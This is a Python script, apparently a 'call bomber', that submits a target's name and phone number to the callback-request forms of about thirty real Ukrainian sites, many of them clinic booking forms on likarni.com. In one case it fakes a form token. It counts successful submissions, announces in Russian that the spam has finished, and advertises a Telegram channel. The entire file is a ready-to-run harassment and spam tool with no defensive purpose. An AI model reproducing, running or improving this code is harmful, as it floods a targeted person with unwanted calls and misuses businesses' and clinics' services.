from spam import *
import requests
import time
import secrets
from datetime import datetime
import random


def random_token():
    token = secrets.token_urlsafe(random.randint(10, 20) + random.randint(5, 10))
    return token


def send_requests_call(name, phone_num, name_o, delay):
    counter = 1
    done = 0
    fail = 0
    try:
        requests.post('https://junker.kiev.ua/postmaster.php',
                      data={
                          'name': name,
                          'tel': phone_num,
                          'action': 'callme'
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 3request
    counter += 1
    try:
        requests.post('https://mobileplanet.ua/new_record',
                      data={
                          'klient_name': name,
                          'klient_phone': phone_num,
                          'this_page_url': 'https://mobileplanet.ua/telefony-349',
                          'object': 'callback'
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 4request
    counter += 1
    try:
        requests.post('https://www.pestocafe.ua/apply-form/callback',
                      data={
                          '_token': random_token(),
                          'name': name,
                          'phone': phone_num
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 5request
    counter += 1
    try:
        requests.post('https://yurcenter.com.ua/',
                      data={
                          'form[yurfirma_name]': name,
                          'form[yurfirma_number]': phone_num,
                          'form[yurfirma_submit': '',
                          'form[formId]': '3'
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 6request
    counter += 1
    try:
        requests.post('http://www.advice.in.ua/vasha-zayavka-prinyata.html/',
                      data={
                          'fio': name + '' + name_o,
                          'type': '2',
                          'tel': phone_num,
                          'capch': '4',
                          'mod': '1'
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 7request
    counter += 1
    try:
        requests.post('https://holdyou.net/api/callback',
                      data={
                          'name': name,
                          'phone': phone_num
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 8request
    counter += 1
    try:
        requests.post('https://doc.ua/main/callbackrequest',
                      data={
                          'crm_models_SupportRequest[user_name]': name,
                          'crm_models_SupportRequest[user_phone]': '+' + phone_num,
                          'crm_models_SupportRequest[link]': 'https://doc.ua/doctors/kiev/all/psiholog'
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 9request
    counter += 1
    try:
        requests.post('https://likarni.com/call',
                      data={
                          'callback[partner_id]': '',
                          'callback[telephone]': phone_num,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 10request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1875',
                          'callback[doctor_id]': '8165',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 11request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1489',
                          'callback[doctor_id]': '5705',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 12request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1999',
                          'callback[doctor_id]': '8856',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 13request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1891',
                          'callback[doctor_id]': '10889',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 14request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '2015',
                          'callback[doctor_id]': '8933',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 15request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1576',
                          'callback[doctor_id]': '6368',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 16request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1576',
                          'callback[doctor_id]': '6367',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 17request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1489',
                          'callback[doctor_id]': '5704',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 18request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1877',
                          'callback[doctor_id]': '8167',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 19request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '2330',
                          'callback[doctor_id]': '10680',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 20request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '458',
                          'callback[doctor_id]': '7822',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 21request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1832',
                          'callback[doctor_id]': '7991',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    # 22request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '2342',
                          'callback[doctor_id]': '7444',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  23request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1832',
                          'callback[doctor_id]': '7990',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  24request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1832',
                          'callback[doctor_id]': '7996',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  25request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '2021',
                          'callback[doctor_id]': '8232',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  26request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1403',
                          'callback[doctor_id]': '9800',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  27request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1953',
                          'callback[doctor_id]': '8697',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  28request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '690',
                          'callback[doctor_id]': '1623',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  29request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '130',
                          'callback[doctor_id]': '7590',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    time.sleep(delay)

    #  30request
    counter += 1
    try:
        time_call = datetime.today().strftime("%Y.%m.%d,+%H:%M")
        requests.post('https://likarni.com/call',
                      data={
                          'callback[clinic_id]': '1929',
                          'callback[doctor_id]': '7495',
                          'callback[partner_id]': '',
                          'callback[name]': name,
                          'callback[telephone]': phone_num,
                          'callback[timer]': time_call,
                          'callback[description]': ''
                      })
        done += 1
        print(Fore.GREEN + f'[{counter}] Запрос успешно отпрвлен!')
    except:
        fail += 1
        print(Fore.RED + f'[{counter}] Запрос не удался!')
    print(Fore.YELLOW + "\nСпам завершился!")
    print(Fore.GREEN + "Успешно: ", f'{done}.')
    print(Fore.RED + "Неуспешно: ", f'{fail}.')
    print(Fore.CYAN + '_______________________________')
    print(Fore.CYAN + "\nНАШ ТЕЛЕГРАМ КАНАЛ: @up_hacker")
